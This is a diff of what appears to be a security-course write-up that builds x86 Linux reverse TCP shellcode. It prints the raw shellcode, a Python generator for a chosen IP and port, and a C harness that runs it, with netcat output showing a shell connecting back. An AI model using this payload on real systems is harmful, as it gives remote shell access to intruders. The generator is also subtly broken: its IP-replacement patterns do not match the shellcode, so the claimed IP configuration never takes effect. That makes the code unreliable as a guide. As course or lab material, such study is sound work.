@@ -484,7 +484,7 @@ Finally, the execve syscall and the program interrupt are called to execute the 
 ; Compilation: ./compile.sh reverse_shell_tcp
 ; Usage: ./reverse_shell_tcp
 ; Testing: nc -lv 4444
-; Shellcode size: ?? bytes
+; Shellcode size: 92 bytes
 ; Architecture: x86
 
 global   _start
@@ -584,7 +584,7 @@ A separate terminal demonstrating a successful reverse connection and shell on t
 
 ```bash
 osboxes@osboxes:~$ nc -lv 4444
-Connection from 127.0.0.1 4444 port [tcp/*] succeeded!
+Connection from 127.0.0.1 port 4444 [tcp/*] accepted
 id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
@@ -596,48 +596,85 @@ Objdump is used to extract the shellcode from the Reverse TCP shell in hex forma
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./reverse_shell_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xc2\x53\x89\xe1\xb0\x0b\xcd\x80"
+"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
 ```
 
 Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the IP address and port number are easily configurable. 
 
-This can be achieved by utilising a Python wrapper which takes a standard 2 byte port number, and checks the chosen port number to ensure the custom port is valid.
+This can be achieved by utilising a Python wrapper which XOR's the given IP address with a key, and takes a standard 2 byte port number and checks the chosen port number to ensure the custom port is valid.
 
 The shellcode variable defined within the script includes the original hardcoded shellcode for port 4444:
 
-```python
+```python 
 #!/usr/bin/python
 
 # Filename: reverse_shell_tcp_wrapper.py
 # Author: h3ll0clar1c3
 # Purpose: Wrapper script to generate dynamic shellcode, configurable IP address and port number
-# Usage: python reverse_shell_tcp_wrapper.py <port>
+# Usage: python reverse_shell_tcp_wrapper.py <IP address> <port>
 
 import socket
 import sys
+import struct
 
 shellcode = """
-\\x31\\xdb\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xbf\\xff\\xff
-\\xff\\xff\\x81\\xf7\\x80\\xff\\xff\\xfe\\x57\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x16
-\\x51\\x52\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x89\\xd3\\x49\\xb0\\x3f\\xcd
-\\x80\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89
-\\xc2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80
+\\x31\\xc0\\x31\\xdb\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xbf\\xff
+\\xff\\xff\\xff\\x81\\xf7\\x80\\xff\\xff\\xfe\\x57\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x16
+\\x51\\x52\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x89\\xd3\\x49\\xb0\\x3f\\xcd\\x80
+\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x88\\x44\\x24\\x0b\\x89\\xe3
+\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80
 """
 
-if (len(sys.argv) < 2):
-    print "Usage: python {name} <port>".format(name = sys.argv[0])
+if (len(sys.argv) < 3):
+    print "Usage: python {name} <IP address> <port>".format(name = sys.argv[0])
     exit()
 
-port = int(sys.argv[1])
+ip = socket.inet_aton(sys.argv[1])
+
+# Find valid XOR byte
+xor_byte = 0
+for i in range(1, 256):
+    matched_a_byte = False
+    for octet in ip:
+        if i == int(octet.encode('hex'), 16):
+            matched_a_byte = True
+            break
+
+    if not matched_a_byte:
+        xor_byte = i
+        break
+
+if xor_byte == 0:
+    print 'Failed to find a valid XOR byte!'
+    exit(1)
+
+# Inject the XOR bytes
+shellcode = shellcode.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x = struct.pack('B', xor_byte).encode('hex')))
+
+# IP address
+ip_bytes = []
+for i in range(0, 4):
+    ip_bytes.append(struct.pack('B', int(ip[i].encode('hex'), 16) ^ xor_byte).encode('hex'))
+
+shellcode = shellcode.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
+    b1 = ip_bytes[0],
+    b2 = ip_bytes[1],
+    b3 = ip_bytes[2],
+    b4 = ip_bytes[3]
+))
+
+# Port
+port = int(sys.argv[2])
 
 if port < 0 or port > 65535:
     print "Invalid port number, must be between 0 and 65535!"
     exit()
-    
-port = hex(socket.htons(int(sys.argv[1])))
+ 
+port = hex(socket.htons(int(sys.argv[2])))
 shellcode = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))
 
-print("Generated shellcode using custom port: " + sys.argv[1])
+# Execute
+print("Generated shellcode using custom IP: " + sys.argv[1] + " and custom port: " + sys.argv[2])
 print shellcode
 
 print "Shellcode length: %d bytes" % len(shellcode)
@@ -646,19 +683,20 @@ if "\x00" in shellcode:
 else:
     print "No nulls detected"
 ```
+
 The Python code dynamically generates shellcode in hex format based on the user input, calculating the shellcode length and checking for Null bytes in the process: 
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ python reverse_shell_tcp_wrapper.py 5555
-Generated shellcode using custom port: 5555
+osboxes@osboxes:~/Downloads/SLAE/Assignment_2$ python reverse_shell_tcp_wrapper.py 127.0.0.1 5555
+Generated shellcode using custom IP: 127.0.0.1 and custom port: 5555
 
-\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff
-\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16
-\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd
-\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89
-\xc2\x53\x89\xe1\xb0\x0b\xcd\x80
+\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff
+\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16
+\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80
+\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3
+\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
 
-Shellcode length: 358 bytes
+Shellcode length: 374 bytes
 No nulls detected
 ```
 
@@ -668,11 +706,11 @@ A simple C program scripted and edited with the newly generated shellcode:
 /**
 * Filename: shellcode.c
 * Author: h3ll0clar1c3
-* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 5555 
+* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 5555  
 * Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final  
 * Usage: ./reverse_shell_tcp_final
 * Testing: nc -lv 5555
-* Shellcode size: ??? bytes
+* Shellcode size: 92 bytes
 * Architecture: x86
 **/
 
@@ -682,11 +720,10 @@ A simple C program scripted and edited with the newly generated shellcode:
 int main(void)
 {
 unsigned char code[] =
-"\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff\x81\xf7\x80"
-"\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80"
-"\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
-"\x69\x89\xe3\x50\x89\xc2\x53\x89\xe1\xb0\x0b\xcd\x80";
-
+"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff"
+"\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03"
+"\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73"
+"\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
     printf("Shellcode length: %d\n", strlen(code));
 
     void (*s)() = (void *)code;
@@ -704,7 +741,7 @@ The C program is compiled as an executable binary with stack-protection disabled
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final
 osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp_final
-Shellcode length: ??
+Shellcode length: 92
 
 ```
 
@@ -712,7 +749,7 @@ A separate terminal demonstrating a successful reverse connection and shell on t
 
 ```bash
 osboxes@osboxes:~$ nc -lv 5555
-Connection from 127.0.0.1 5555 port [tcp/*] succeeded!
+Connection from 127.0.0.1 port 5555 [tcp/*] accepted
 id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
